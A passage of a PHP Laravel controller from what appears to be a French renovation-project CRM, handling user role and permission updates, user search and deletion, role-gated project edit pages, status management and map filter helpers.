                'email.email'                => __('Email is required'),
                'email.unique'                  => __('This email is already exist'),
                // 'username.required'          => __('User name is required'),
                // 'username.unique'            => __('This user name is already exist'),
                'password.required'             => __('Password is required'),
                'password.regex'                => 'Au moins 8 caractères, une lettre majuscule et un caractère spécial sont requis.',
                'confirm_password.required'     => __('Confirm password is required'),
                'confirm_password.same'         => __('Confirm password must be same as password'),
                // 'email_professional.required'   =>  'Le champ Email professionnel est requis' ,
                // 'phone_professional.required'   =>  'Le champ Téléphone professionnel est requis',
                // 'prenom_professional.required'  =>  'Le champ Prénom professionnel est requis',
                'role_id.required'              => __('Role is required'),
            ]); 
        }else{
            $request->validate([ 
                'name'              => 'required',
                'regie_id'          => 'required_with:regie',
                'team_leader'       => 'required_with:teamLeader',
                'email'             => 'required|email|unique:users,email,'.$request->user_id,  
                // 'email_professional'           => 'required',
                // 'phone_professional'           => 'required',
                // 'prenom_professional'           => 'required',
                'role_id'           => 'required',
                'photo'             => 'image'
            ],[
                'name.required'                 => __('Name is required'),
                'regie_id.required_with'        => __('Regie is required'),
                'team_leader.required_with'     => __('CHEF D’EQUIPE is required'),
                'email.required'                => __('Email is required'),
                'email.email'                => __('Email is required'),
                'email.unique'                  => __('This email is already exist'), 
                // 'email_professional.required'   =>  'Le champ Email professionnel est requis' ,
                // 'phone_professional.required'   =>  'Le champ Téléphone professionnel est requis',
                // 'prenom_professional.required'  =>  'Le champ Prénom professionnel est requis',
                'role_id.required'              => __('Role is required'),
            ]); 
        }

        $user = User::find($request->user_id);
        if($user->role_id != $request->role_id){
 
            $current_category = Role::find($request->role_id); 
            CommentCategoryAssign::where('user_id', $user->id)->get()->each->delete();
            foreach($current_category->commentCategory as $comment_category){
                CommentCategoryAssign::create([
                    'comment_category_id' => $comment_category->id,
                    'user_id' => $user->id
                ]);
            }  
            
            $name = Auth::user()->name;
            $subject = 'Role Change';
            $body = $request->name.', Your role have been changed';
            if($request->email_professional){
                Mail::to($request->email_professional)->send(new AssignMail($subject, $body));
            }


            $old_permissions = ActionPermission::where('user_id', $user->id)->get();
            $x_perms = Permission::where('user_id', $user->id)->get();
            foreach($x_perms as $perm){
                $perm->delete();
            }
            $perms = UserPermission::where('role_id', $request->role_id)->get();
            foreach($perms as $prm){
                Permission::create([ 
                    'role_id' =>  $prm->role_id,
                    'name'    => $prm->route,
                    'navigation_id' => $prm->navigation_id,
                    'user_id'      => $user->id,
                ]);
            }
            foreach($old_permissions as $o_perm){
                $o_perm->delete();
            }
            $permissions = RoleActionPermission::where('role_id', $request->role_id)->get();
            foreach($permissions as $permission){
                ActionPermission::create([
                    'user_id' => $user->id,
                    'module_name' => $permission->module_name,
                    'action_name' => $permission->action_name,
                ]);
            }
        }

        if($request->file('photo')){
            $image = $request->file('photo');
            $path = public_path('uploads/crm/profiles'); 
            $fileName = $user->id.rand(00000,99999).'.'.$image->extension();
            $image->move($path, $fileName);
            $user->profile_photo = $fileName; 
        }
     
        $user->name         = $request->name;
        $user->first_name   = $request->first_name;
        $user->regie_id     = $request->regie ? $request->regie_id : null;
        $user->team_leader  = $request->teamLeader ? $request->team_leader : null; 
        $user->status       = $request->status ? 'active':"deactive";
        $user->email        = $request->email;
        if($request->password){
            $user->password = Hash::make($request->password);
        }
        $user->telephone    = $request->telephone;
        $user->email_professional = $request->email_professional;
        $user->phone_professional = $request->phone_professional;
        $user->prenom_professional = $request->prenom_professional;
        $user->role         = Role::find($request->role_id)->value;
        $user->role_id      = $request->role_id;
        $user->save();

        $users = User::where('deleted_status', 'no')->where('status', 'active')->where('role', '<>' ,'s_admin')->paginate(10);
        $headers = UserHeader::all();
        $filter_status = UserHeaderFilter::where('user_id', Auth::id())->orderBy('user_header_id', 'asc')->get();
        $all_users = view('includes.crm.users', compact('users', 'headers', 'filter_status'));
      
        $updated_user = $all_users->render();

        return back()->with('success', __('Updated Successfully'));
        // return response()->json(['updated_user' => $updated_user, 'alert' => __('Updated Successfully')]);  
    }

    // User Search 
    public function allUserSearch(Request $request){
        $company_name = 'all';
        $search = $request->search;
        $column = $request->column;
        if($search){

            $users = User::where($column, 'LIKE', '%'.$search.'%')->where('deleted_status', 'no')->get();

        }
        else{
            $users = User::where('deleted_status', 'no')->paginate(paginationNumber('users')); 
        }
        $headers = UserHeader::all();
        $filter_status = UserHeaderFilter::where('user_id', Auth::id())->orderBy('user_header_id', 'asc')->get();
        $all_users = view('includes.crm.users', compact('users', 'headers', 'filter_status'));
      
        $searched = $all_users->render();

        return response()->json(['search' => $searched]); 

    }

    // User Delete 
    public function userDelete(Request $request){
       $user = User::find($request->user_id);
        $user->deleted_status = 'yes';
        $user->save();

        return redirect()->back()->with('success', 'User Deleted Successfully');
    }
    
    // User Delete 
    public function userBulkDelete(Request $request){

        $ids = explode(',', $request->user_id);
        
        foreach($ids as $id){
            $user = User::find($id);
            if($user){
                $user->deleted_status = 'yes';
                $user->save();
            }
        } 

        return redirect()->back()->with('success', 'User Deleted Successfully');
    }


    // User Header Filter 
    public function userHeaderFilter(Request $request){
        $existing_filter = UserHeaderFilter::where('user_id', Auth::id())->get(); 
        foreach($existing_filter as $item){
            $item->delete();
        } 
            
        if($request->header_id){
            foreach($request->header_id as $id){
                UserHeaderFilter::create([
                    'user_header_id'    => $id,
                    'user_id'           => Auth::id(),
                ]);
            }
        }

        return back()->with('success', __('Filter Added'));
    }

    // My files 
    public function projectEdit($id){
        $permission = false;

        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(in_array(role(), $administrarif_role)){
            $permission = true;
        }else{
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $projects = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id')->toArray();

            }else if(role() == 'team_leader'){
                $team_users = Auth::user()->getTeamUsers;
                $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                $projects = NewProject::whereIn('id', $intervention_project_ids)->where('deleted_status', 0)->pluck('id')->toArray();
            }else{

                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                    $projects = Auth::user()->getTelecommiercialProjects()->where('deleted_status', 0)->pluck('id')->toArray();
                }else{
                    $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray();
                    $projects = NewProject::whereIn('id', $intervention_project_ids)->where('deleted_status', 0)->pluck('id')->toArray();
                }
            } 
            if(in_array($id, $projects)){
                $permission = true;
            }
        }

        if(!$permission){
            return redirect()->route('project.index');
        }


        if (checkAction(Auth::id(), 'project', 'edit') || in_array(role(), $administrarif_role)){
            $project = NewProject::find($id);
            if(!$project || $project->deleted_status == 1){
                return redirect()->route('project.index')->with('error', 'Ce chantier est supprimé');
            }
            if($project && $project->callback_time && $project->callback_history_type == 0 && $project->callback_time < Carbon::now()){
                CallbackHistory::create([
                    'type' => 'project',
                    'feature_id' => $project->id,
                    'expired_date' => $project->callback_time,
                    'callback_user_id' => $project->callback_user_id,
                    'user_id' => Auth::id(),
                    'status' => '',
                ]);
                $project->callback_history_type = 1;
                $project->save();
            }
            
             
            $tax = ProjectTax::where('project_id', $id)->orderBy('primary', 'asc')->get();
            $primary_tax = ProjectTax::where('project_id', $id)->where('primary', 'yes')->first(); 
            $current_project_label = ProjectNewStatus::find($project->project_label);
            // $project_sub_status = ProjectSubStatus::orderBy('order','asc')->get();
            $project_sub_status = $current_project_label->getSubStatus;
            $project_statuses = ProjectNewStatus::orderBy('order', 'asc')->get();


            $activities = PannelLogActivity::where('feature_type', 'project')->where('feature_id', $id)->orderBy('id', 'desc')->get(); 
             
            if(role() == 's_admin'){
                $comments = ProjectComment::where('project_id', $id)->orderBy('id', 'desc')->get(); 
                $categories = CommentCategory::all();
            }else{
                $comments = ProjectComment::whereIn('category_id', Auth::user()->commentCategory->pluck('id'))->where('project_id', $id)->orderBy('id', 'desc')->get(); 
                $categories = Auth::user()->commentCategory; 
            }
            
            $users = User::where('deleted_status', 'no')->where('status', 'active')->get();
            
            $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
            
            $quality_controls = ControleQuality::where('project_id', $id)->orderBy('id', 'desc')->get();
            $control_sur_sites = ControleSurSite::where('project_id', $id)->orderBy('id', 'desc')->get(); 
            $selected_baremes = $project->ProjectBareme;
            if (role() == 'telecommercial' || role() == 'telecommercial_externe' || role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $project_interventions = $project->getIntervention()->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->get();
            }else{
                $project_interventions = $project->getIntervention;
            }
            $tag_users_id = []; 
            if($project->getProjectTelecommercial){
                $tag_users_id[] = $project->project_telecommercial;
                if($project->getProjectTelecommercial->getRegie &&  $project->getProjectTelecommercial->getRegie->getUser){
                    $tag_users_id[] = $project->getProjectTelecommercial->getRegie->getUser->id; 
                }
            }
            foreach($project->getIntervention as $intervention){
                if($intervention->user_id){
                    $tag_users_id[] = $intervention->user_id;
                }
            }
            if($project->projectGestionnaire){
                $tag_users_id[] = $project->project_gestionnaire; 
            }
            $assign_users = User::whereIn('id', $tag_users_id)->where('deleted_status', 'no')->where('status', 'active')->get();

            $admin_tag_role = Role::whereIn('category_id', [3,4])->where('value', '<>', 'Logistique')->pluck('value')->toArray();
            $admin_users = User::whereIn('role', $admin_tag_role)->where('deleted_status', 'no')->where('status', 'active')->get();

            $tag_users = $admin_users->merge($assign_users);

            $project_static_tabs = ProjectStaticTab::all();
            $role = Auth::user()->role;
            $user_actions = Auth::user()->checkAction; 

            $address = '';
            if($project->primaryTax){
                if($project->primaryTax->google_address){
                    $address = $project->primaryTax->google_address;
                }else{
                    $address = $project->Adresse .' '. $project->Code_Postal .' '. $project->Ville;
                }
            }
            $location = self::location($address);
 
            $lat  = $location['status'] == 'success' ? $location['lat'] ?? 48.066709713351116 : 48.066709713351116;
            $lng  = $location['status'] == 'success' ? $location['lng'] ?? -2.965925932451392 : -2.965925932451392;

            $bareme_status = false;
            if($selected_baremes->whereIn('id',  [28,29])->first()){
                $bareme_status = true;
            }
            return view('admin.edit-project', compact('project', 'tax', 'primary_tax', 'project_interventions', 'selected_baremes', 'user_actions', 'project_static_tabs', 'role', 'project_statuses', 'activities', 'quality_controls', 'control_sur_sites', 'comments', 'categories', 'project_sub_status', 'bareme_travaux_tags', 'tag_users', 'users', 'lat', 'lng', 'bareme_status'));
        }else{
            return back()->with('error', __('You are not authorized to make this action'));
        }
    }
    public function projectImportEdit($id){
         

        if (role() == 's_admin'){
            $project = NewProject::find($id);
            if(!$project || $project->deleted_status == 0){
                return redirect()->route('project.index')->with('error', 'Ce chantier est supprimé');
            }
             
            $tax = ProjectTax::where('project_id', $id)->orderBy('primary', 'asc')->get();
            $primary_tax = ProjectTax::where('project_id', $id)->where('primary', 'yes')->first(); 
            $current_project_label = ProjectNewStatus::find($project->project_label);
            // $project_sub_status = ProjectSubStatus::orderBy('order','asc')->get();
            $project_sub_status = $current_project_label->getSubStatus;
            $project_statuses = ProjectNewStatus::orderBy('order', 'asc')->get();


            $activities = PannelLogActivity::where('feature_type', 'project')->where('feature_id', $id)->orderBy('id', 'desc')->get(); 
              
            $comments = ProjectComment::where('project_id', $id)->orderBy('id', 'desc')->get(); 
            $categories = CommentCategory::all();
            
            $users = User::where('deleted_status', 'no')->where('status', 'active')->get();
            
            $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
            
            $quality_controls = ControleQuality::where('project_id', $id)->orderBy('id', 'desc')->get();
            $control_sur_sites = ControleSurSite::where('project_id', $id)->orderBy('id', 'desc')->get(); 
            $selected_baremes = $project->ProjectBareme;
            $project_interventions = $project->getIntervention;
            
            $tag_users_id = []; 
            if($project->getProjectTelecommercial){
                $tag_users_id[] = $project->project_telecommercial;
                if($project->getProjectTelecommercial->getRegie &&  $project->getProjectTelecommercial->getRegie->getUser){
                    $tag_users_id[] = $project->getProjectTelecommercial->getRegie->getUser->id; 
                }
            }
            foreach($project->getIntervention as $intervention){
                if($intervention->user_id){
                    $tag_users_id[] = $intervention->user_id;
                }
            }
            if($project->projectGestionnaire){
                $tag_users_id[] = $project->project_gestionnaire; 
            }
            $assign_users = User::whereIn('id', $tag_users_id)->where('deleted_status', 'no')->where('status', 'active')->get();

            $admin_tag_role = Role::whereIn('category_id', [3,4])->where('value', '<>', 'Logistique')->pluck('value')->toArray();
            $admin_users = User::whereIn('role', $admin_tag_role)->where('deleted_status', 'no')->where('status', 'active')->get();

            $tag_users = $admin_users->merge($assign_users);

            $project_static_tabs = ProjectStaticTab::all();
            $role = Auth::user()->role;
            $user_actions = Auth::user()->checkAction; 

            $address = '';
            if($project->primaryTax){
                if($project->primaryTax->google_address){
                    $address = $project->primaryTax->google_address;
                }else{
                    $address = $project->Adresse .' '. $project->Code_Postal .' '. $project->Ville;
                }
            }
            $location = self::location($address);
 
            $lat  = $location['status'] == 'success' ? $location['lat'] ?? 48.066709713351116 : 48.066709713351116;
            $lng  = $location['status'] == 'success' ? $location['lng'] ?? -2.965925932451392 : -2.965925932451392;

            $bareme_status = false;
            if($selected_baremes->whereIn('id',  [28,29])->first()){
                $bareme_status = true;
            }
            return view('admin.edit-project-import', compact('project', 'tax', 'primary_tax', 'project_interventions', 'selected_baremes', 'user_actions', 'project_static_tabs', 'role', 'project_statuses', 'activities', 'quality_controls', 'control_sur_sites', 'comments', 'categories', 'project_sub_status', 'bareme_travaux_tags', 'tag_users', 'users', 'lat', 'lng', 'bareme_status'));
        }else{
            return back()->with('error', __('You are not authorized to make this action'));
        }
    }
    public function myFiles($id){
        $permission = false;
        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(in_array(role(), $administrarif_role)){
            $permission = true;
        }else{
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $projects = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id')->toArray();

            }else if(role() == 'team_leader'){
                $team_users = Auth::user()->getTeamUsers;
                $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                $projects = NewProject::whereIn('id', $intervention_project_ids)->where('deleted_status', 0)->pluck('id')->toArray();
            }else{

                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                    $projects = Auth::user()->getTelecommiercialProjects()->where('deleted_status', 0)->pluck('id')->toArray();
                }else{
                    $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray();
                    $projects = NewProject::whereIn('id', $intervention_project_ids)->where('deleted_status', 0)->pluck('id')->toArray();
                }
            } 
            if(in_array($id, $projects)){
                $permission = true;
            }
        }

        if(!$permission){
            return back();
        }


        if (checkAction(Auth::id(), 'project', 'edit') || in_array(role(), $administrarif_role)){
        $project = NewProject::find($id);

        if($project && $project->callback_time && $project->callback_history_type == 0 && $project->callback_time < Carbon::now()){
            CallbackHistory::create([
                'type' => 'project',
                'feature_id' => $project->id,
                'expired_date' => $project->callback_time,
                'callback_user_id' => $project->callback_user_id,
                'user_id' => Auth::id(),
                'status' => '',
            ]);
            $project->callback_history_type = 1;
            $project->save();
        }
        
        // dd($project);
        $tax = ProjectTax::where('project_id', $id)->orderBy('primary', 'asc')->get();
        $primary_tax = ProjectTax::where('project_id', $id)->where('primary', 'yes')->first();
        // $tax_zone = checkZone($project->lead_id, $project->company_id);
        $childrens = Children::where('project_id', $project->id)->get(); 
        $project_sub_status = ProjectSubStatus::orderBy('order','asc')->get();
        $project_statuses = ProjectNewStatus::orderBy('order', 'asc')->get();
        if($primary_tax && $primary_tax->postal_code){
            $tax_zone = getPrimaryZone($primary_tax->postal_code);
            $tax_precariousness = getPrecariousness($project->Nombre_de_personnes, $project->Revenue_Fiscale_de_Référence, $primary_tax->postal_code);
        }else{
            $tax_zone = '';
            $tax_precariousness = '';
        }

        $activities = PannelLogActivity::where('feature_type', 'project')->where('feature_id', $id)->orderBy('id', 'desc')->get(); 
        
        $trait = ProjectTrait::where('project_id', $id)->first();
        if(!$trait){
            $trait = ProjectTrait::create(['project_id' => $id]);
        }
        $intervention = Intervention::where('project_id', $id)->first();
        if(!$intervention){
            $intervention = Intervention::create(['project_id' => $id]);
        }
        $report  = Rapport::where('project_id', $id)->first(); 
        if(!$report){
            $report  = Rapport::create(['project_id' => $id]); 
        }
        $report2  = SecondReport::where('project_id', $id)->first(); 
        if(!$report2){
            $report2  = SecondReport::create(['project_id' => $id]); 
        }

        $work = Work::where('project_id', $id)->first();
        if(!$work){
            $work = Work::create(['project_id' => $id]);
        }
        $question = Question::where('project_id', $id)->first();
        if(!$question){
            $question = Question::create(['project_id' => $id]);
        }

        $preInstallation = PreInstallation::where('project_id', $id)->first();
        if(!$preInstallation){
            $preInstallation = PreInstallation::create(['project_id' => $id]);
        }
        $postInstallation = PostInstallation::where('project_id', $id)->first();
        if(!$postInstallation){
            $postInstallation = PostInstallation::create(['project_id' => $id]);
        }
        $second_project = SecondProject::where('project_id', $id)->first();
        if(!$second_project){
            $second_project = SecondProject::create(['project_id' => $id]);
        }
        if(role() == 's_admin'){
            $comments = ProjectComment::where('project_id', $id)->orderBy('id', 'desc')->get(); 
            $categories = CommentCategory::all();
        }else{
            $comments = ProjectComment::whereIn('category_id', Auth::user()->commentCategory->pluck('id'))->where('project_id', $id)->orderBy('id', 'desc')->get(); 
            $categories = Auth::user()->commentCategory; 
        }
        
        $users = User::where('deleted_status', 'no')->where('status', 'active')->get();
        $tenhnicians = User::where('deleted_status', 'no')->where('status', 'active')->where('role', 'technicians')->get();
        $operations = WorkDone::where('project_id', $id)->get();  
        $addition_products = AdditionalProduct::where('project_id', $id)->orderBy('order', 'asc')->get();

        $energy_aid = EnergyAid::where('project_id', $id)->first();
        if(!$energy_aid){
            $energy_aid = EnergyAid::create(['project_id' => $id]);
        }
        $suppliers = Fournisseur::where('active', 'Oui')->get();
        $campagne_types = Campagnetype::all();
        $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
        $heatings = HeatingMode::orderBy('order', 'asc')->get();
        $agents = Agent::where('active', 'Oui')->get();
        $travauxs = TravauxList::all();
        $scales = Scale::where('active', 'yes')->where('deleted_status', 'no')->get();
        $banques = Banque::all();  
        $quality_controls = ControleQuality::where('project_id', $id)->orderBy('id', 'desc')->get();
        $control_sur_sites = ControleSurSite::where('project_id', $id)->orderBy('id', 'desc')->get();
        $control_offices = Control::all();
        $inspection_statuses = InspectionStatus::all();
        $controlled_works = ControlledWork::all();
        $compliances = Compliance::all(); 
        $commissioning_technicians = CommissioningTechnician::all();
        $commissioning_statuses = CommissioningStatus::all();
        $deals = Deal::all();
        $prestation_group = PrestationGroup::all();
        $installers = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get();
        $facturation = Facturation::where('project_id', $id)->first();
        if(!$facturation){
            $facturation = Facturation::create(['project_id' => $id]);
        }
        $delegates = Delegate::all();
        $management_control = ManagementControl::where('project_id', $id)->first();
        if(!$management_control){
            $management_control = ManagementControl::create(['project_id' => $id]);
        }


        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        $min_30_interval = [];
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        }  
        
        if(!$energy_aid){
            $energy_aid = EnergyAid::create(['project_id' => $id]);
        }
        $sidebar_info = DevisSidebar::where('project_id', $id)->first();
        if(!$sidebar_info){
            $sidebar_info = DevisSidebar::create(['project_id' => $id]);
        } 
        $single_ticket = Ticketing::latest()->first(); 
        $qc_type = QualityControlType::all();
        $document_controls = DocumentControl::orderBy('order', 'asc')->get();
        $status_planning = StatusPlanningIntervention::all();
        $charge_etudes = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get();
        $ko_reasons = ProjectDeadReason::all();
        $reflection_reasons = ProjectReflectionReason::all();
        $products = Product::latest()->get();
        $technical_commercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get();
        $team_laeders = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get();
        $project_control_photos = ProjectControlPhoto::all();
        $offices = Auditor::all();
        $status_audits = AuditStatus::all();
        $report_results = ReportResult::all();
        $statut_maprimerenovs = StatutMaprimerenov::orderBy('order', 'asc')->get();
        $mandataire_maprimerenovs = Agent::all();
        $administrarif_role_id  = Role::where('category_id', 3)->pluck('id');
        $suvbention_gestionnaires = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', $administrarif_role_id)->get();
        $all_inputs = ProjectCustomField::all();
        $entreprise_de_travauxs = Installer::all();
        $documents = Document::all();
        $reject_reasons = RejectReason::all();
        $amos = Amo::all();
        $emails = [$project->Email, $project->Compte_email, $project->Compte_Email_de_récupération_email, $project->Email_de_transfert_Email, $project->Compte_MaPrimeRenov_email]; 
        $all_emails = StoreEmail::whereIn('from', $emails)->get();
        $selected_baremes = $project->ProjectBareme;
        if (role() == 'telecommercial' || role() == 'telecommercial_externe' || role() == 'sales_manager' || role() == 'sales_manager_externe'){
            $project_interventions = $project->getIntervention()->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->get();
        }else{
            $project_interventions = $project->getIntervention;
        }
        $tag_users_id = []; 
        if($project->getProjectTelecommercial){
            $tag_users_id[] = $project->project_telecommercial;
            if($project->getProjectTelecommercial->getRegie &&  $project->getProjectTelecommercial->getRegie->getUser){
                $tag_users_id[] = $project->getProjectTelecommercial->getRegie->getUser->id; 
            }
        }
        foreach($project->getIntervention as $intervention){
            if($intervention->user_id){
                $tag_users_id[] = $intervention->user_id;
            }
        }
        if($project->projectGestionnaire){
            $tag_users_id[] = $project->project_gestionnaire; 
        }
        $assign_users = User::whereIn('id', $tag_users_id)->where('deleted_status', 'no')->where('status', 'active')->get();

        $admin_tag_role = Role::whereIn('category_id', [3,4])->where('value', '<>', 'Logistique')->pluck('value')->toArray();
        $admin_users = User::whereIn('role', $admin_tag_role)->where('deleted_status', 'no')->where('status', 'active')->get();

        $tag_users = $admin_users->merge($assign_users);

        $project_static_tabs = ProjectStaticTab::all();
        $role = Auth::user()->role;
        $user_actions = Auth::user()->checkAction; 
        $technical_referees = TechnicalReferee::all();
        return view('admin.my-files', compact('project', 'tax', 'tax_zone','tax_precariousness', 'childrens', 'trait', 'intervention', 'report','report2', 'work', 'question' , 'activities', 'preInstallation' , 'users', 'postInstallation', 'second_project', 'comments', 'tenhnicians', 'operations', 'addition_products', 'energy_aid', 'sidebar_info', 'categories', 'scales', 'suppliers', 'travauxs', 'banques', 'min_30_interval', 'quality_controls','control_offices', 'inspection_statuses', 'controlled_works', 'compliances', 'control_sur_sites', 'commissioning_technicians', 'commissioning_statuses', 'deals', 'facturation', 'delegates', 'management_control', 'prestation_group', 'installers', 'single_ticket', 'qc_type', 'primary_tax', 'campagne_types', 'bareme_travaux_tags', 'heatings', 'project_sub_status', 'document_controls', 'status_planning', 'charge_etudes', 'ko_reasons', 'reflection_reasons', 'products', 'technical_commercials', 'team_laeders', 'project_control_photos', 'offices', 'status_audits', 'report_results', 'statut_maprimerenovs', 'mandataire_maprimerenovs', 'suvbention_gestionnaires', 'all_inputs', 'agents', 'entreprise_de_travauxs', 'project_statuses', 'documents', 'reject_reasons', 'amos', 'all_emails', 'selected_baremes', 'project_interventions', 'project_static_tabs', 'role', 'user_actions', 'technical_referees', 'tag_users'));
        }else{
            return back()->with('error', __('You are not authorized to make this action'));
        }
    }

    // Status add 
    public function statusAdd(Request $request){

        $request->validate([
            'status'            => 'required',
            'status_color'      => 'required',
            'background_color'  => 'required',
        ],[
            'status.required'           => __('Status is required'),
            'status_color.required'     => __('Status color is required'),
            'background_color.required' => __('Status background color is required'),
        ]);
        if($request->status_type == 'project'){
            ProjectTableStatus::create($request->except('_token', 'status_type'));
        }elseif($request->status_type == 'client'){
            ClientTableStatus::create($request->except('_token', 'status_type'));
        }else{
            LeadStatus::create($request->except('_token', 'status_type'));
        }
        return  redirect()->back()->with('success', __('Added Successfully'))->with('status_tab_active', 'or bi bohut kuss karne parega');
    }

    public function allStatus(Request $request){
        if($request->data == 'project'){
            $items =  ProjectTableStatus::all();
        }elseif($request->data == 'client'){
            $items = ClientTableStatus::all();
        }else{
            $items = LeadStatus::all();
        }
        $type = $request->data;
        $data = view('includes.crm.all_status', compact('items', 'type'))->render(); 
        return response($data);
    }

    public function allStatusDelete(Request $request){
        if($request->data == 'project'){
            $projects = Project::where('user_status', $request->id)->get();
            if($projects->count() > 0){
                foreach($projects as $project){
                    $project->user_status = '';
                    $project->save();
                }
            }
            ProjectTableStatus::find($request->id)->delete();
            $items =  ProjectTableStatus::all();
        }elseif($request->data == 'client'){
            $clients = Client::where('user_status', $request->id)->get();
            if($clients->count() > 0){
                foreach($clients as $client){
                    $client->user_status = '';
                    $client->save();
                }
            }
            ClientTableStatus::find($request->id)->delete();
            $items = ClientTableStatus::all();
        }else{
            $leads = Lead::where('user_status', $request->id)->get();
            if($leads->count() > 0){
                foreach($leads as $lead){
                    $lead->user_status = '';
                    $lead->save();
                }
            }
            LeadStatus::find($request->id)->delete();
            $items = LeadStatus::all(); 
        }

        $type = $request->data;
        $data = view('includes.crm.all_status', compact('items', 'type'))->render(); 
        return response()->json(['data' => $data, 'alert' => __('Deleted Succesfully')]);
    }

    public function savIndex(Request $request){
        $savs = ProjectSav::all();
        $headers = SavHeader::all();
        $filter_status = SavHeaderFilter::where('user_id', Auth::id())->orderBy('sav_header_id', 'asc')->get();
        return view('admin.sav', compact('savs', 'headers', 'filter_status'));
    }
    
    public function ringoverIndex(Request $request){  
        $currentRoute = Route::currentRouteName();
        // $permission = Permission::where('user_id', Auth::id())->where('name', $currentRoute)->first();
        return view('admin.ringover');
    }


    public function savHeaderFilter(Request $request){
        $existing_filter = SavHeaderFilter::where('user_id', Auth::id())->get(); 
        foreach($existing_filter as $item){
            $item->delete();
        } 
            
        if($request->header_id){
            foreach($request->header_id as $id){
                SavHeaderFilter::create([
                    'sav_header_id'    => $id,
                    'user_id'           => Auth::id(),
                ]);
            }
        }

        return back()->with('success', __('Filter Added'));
    } 

    public function leaderboard(){
        return back();
        $users = User::where('deleted_status', 'no')->where('status', 'active')->paginate(paginationNumber('users'));
        return view('admin.leaderboard', compact('users'));
    }

    public function analyticTogglerUpdate(Request $request){
        $data = AnalyticToggler::where('user_id', Auth::id())->where('module', $request->module)->first();
        if($data){
            $data->update([
                'status'    => $request->status,
            ]);
        }
        else{
            AnalyticToggler::create([
                'user_id'   => Auth::id(),
                'module'    => $request->module,
                'status'    => $request->status,
            ]);
        }

        return response('Success');
    }

    public function pannelLog(){
        $default_activities = PannelLogActivity::where('status' ,'default')->orderBy('id', 'desc')->take(500)->get(); 
        $change_etiquette_activities = PannelLogActivity::where('status' ,'change_etiquette')->orderBy('id', 'desc')->take(500)->get(); 
        return view('includes.pannel-log', compact('default_activities', 'change_etiquette_activities'));
    }
    public function pannelLogData(Request $request){
        $activity = PannelLogActivity::find($request->log_id); 
        $default = view('includes.pannel-single-default-log-wrapper', compact('activity'))->render();
        $status_change = view('includes.pannel-single-status-change-log-wrapper', compact('activity'))->render();
        return response(['status' =>$activity->status, 'default' => $default, 'status_change' => $status_change]);
    }

    public function mapCategoryChange(Request $request){
        if($request->value == 'prospect'){
            $statuses = LeadStatus::all();
            $status_data = view('admin.status_select_option', compact('statuses'))->render();
        }elseif($request->value == 'client'){
            $status_data = '<option value="">Etiquette</option>';

        }elseif($request->value == 'chantier'){
            $statuses = ProjectNewStatus::orderBy('order', 'asc')->get();
            $status_data = view('admin.status_select_option', compact('statuses'))->render();
        }else{
            return response('something is wrong');
        }
        return response()->json(['status' => $status_data]);
    }
    public function mapLabelChange(Request $request){
        $single_select = false;
        if($request->category == 'prospect'){
            $label = LeadStatus::find($request->label);
            if($label){
                $sub_statuses = $label->getSubStatus;
                $sub_status_data = view('admin.sub_status_select_option', compact('sub_statuses', 'single_select'))->render();
            }else{
                $sub_status_data = '';
            }
        }elseif($request->category == 'client'){
            $sub_status_data = '';
        }elseif($request->category == 'chantier'){
            $label = ProjectNewStatus::find($request->label);
            if($label){
                $sub_statuses = $label->getSubStatus;
                $sub_status_data = view('admin.sub_status_select_option', compact('sub_statuses', 'single_select'))->render();
            }else{
                $sub_status_data = '';
            }
        }else{
            return response('something is wrong');
        }
        return response()->json(['sub_status' => $sub_status_data]);
    }

    public function calculatteDepertidion(){
        return view('admin.calculatte-depertidion');
    }
    public function depertidionPdf(){
        $data = request()->all(); 
        return view('admin.depertidion-pdf', compact('data'));
    }
    public function calculatteBarth(){
        $prices = BarthPrice::all();
        return view('admin.calculatte-barth', compact('prices'));
    }
    public function calculatteReno(){
        $prices = RenoPrice::all();
        return view('admin.calculatte-reno', compact('prices'));
    }

    public function userColorUpdate(Request $request){
        $user = User::find($request->id);
        $user->update([
            'color' => $request->color,
            'background_color' => $request->background_color
        ]);
        return back()->with('success', __('Updated Successfully'))->with('color_user', '1');
    }

    public function planningCustomFilter(Request $request){
        $request->validate([
